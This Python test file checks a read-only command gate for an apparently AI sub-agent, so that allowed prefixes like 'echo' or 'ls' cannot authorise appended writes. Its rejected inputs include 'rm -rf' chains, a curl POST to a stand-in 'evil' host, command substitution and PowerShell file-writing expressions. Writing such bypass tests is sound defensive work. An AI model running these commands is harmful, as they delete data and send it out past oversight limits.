"""Read-only sub-agent bash gating: the WHOLE command must be read-only.

Audit P1-04: the old check used ``command.startswith(prefix)``, so
``echo hi && rm -rf data`` passed because it "starts with echo".
"""

from __future__ import annotations

import pytest

from RxyCode.RxyCode1_1_0.core.subagents.workspace import is_read_only_command


class TestAllowedProbes:
    @pytest.mark.parametrize(
        "command",
        [
            "ls",
            "ls -la",
            "cat README.md",
            "grep -rn TODO src",
            "pwd",
            "echo hello",
            "git status",
            "git diff HEAD",
            "git log --oneline -5",
            "wc -l file.txt",
            "whoami",
            "head -20 app.log",
            "tail -f log | grep error",
            "cat a.txt | wc -l",
        ],
    )
    def test_single_and_piped_read_only_commands_pass(self, command: str) -> None:
        assert is_read_only_command(command) is True


class TestAppendedWrites:
    """The regression: an allowed prefix must not authorise a later write."""

    @pytest.mark.parametrize(
        "command",
        [
            "echo hi && rm -rf data",
            "echo hi; rm -rf data",
            "echo hi || touch pwned",
            "cat a.txt && python -c \"open('x','w').write('y')\"",
            "ls & rm -rf data",
            "echo hi | tee out.txt",
            "pwd && curl -X POST http://evil/x",
            "git status; git commit -am x",
            "cat f > out.txt",
            "cat f >> out.txt",
            "echo $(rm -rf /tmp/x)",
            "cat `whoami`",
            "echo hi\nrm -rf data",
        ],
    )
    def test_write_appended_to_read_only_prefix_is_rejected(self, command: str) -> None:
        assert is_read_only_command(command) is False, command


class TestExecutableExpressions:
    """A whitelisted prefix must not smuggle an executable expression.

    ``echo (...)`` is one segment that "starts with echo" but runs whatever is
    inside the parentheses -- including .NET calls that write files.
    """

    @pytest.mark.parametrize(
        "command",
        [
            'echo ([IO.File]::WriteAllText("C:/tmp/pwn.txt","x"))',
            "echo (New-Item -Path C:/tmp/y.txt -Force)",
            "echo (Remove-Item C:/tmp/z.txt -Force)",
            'echo ([ScriptBlock]::Create("1").Invoke())',
            "echo @{a=1}",
            "cat (Resolve-Path secret.txt)",
            "echo $([System.IO.File]::ReadAllText('x'))",
            "git status (Remove-Item x)",
            "ls {Remove-Item x}",
        ],
    )
    def test_expression_bypass_is_rejected(self, command: str) -> None:
        assert is_read_only_command(command) is False, command

    @pytest.mark.parametrize(
        "command",
        [
            'grep "[0-9]" file.txt',
            "grep -E '^(Name|Version)' file.txt",
            'cat "file with spaces.txt"',
            "git log --format='%H %s'",
        ],
    )
    def test_quoted_data_is_still_allowed(self, command: str) -> None:
        assert is_read_only_command(command) is True, command


class TestEdgeCases:
    def test_empty_command_is_not_read_only(self) -> None:
        assert is_read_only_command("") is False
        assert is_read_only_command("   ") is False

    def test_prefix_must_be_a_whole_token(self) -> None:
        """``lsblk`` must not match the ``ls`` prefix."""
        assert is_read_only_command("lsblk") is False
        assert is_read_only_command("catapult --run") is False

    def test_stderr_only_redirect_stays_allowed(self) -> None:
        # "2>&1" / "> /dev/null" do not write workspace content.
        assert is_read_only_command("ls 2>/dev/null") is True

    def test_unknown_segment_rejected(self) -> None:
        assert is_read_only_command("ls && make build") is False
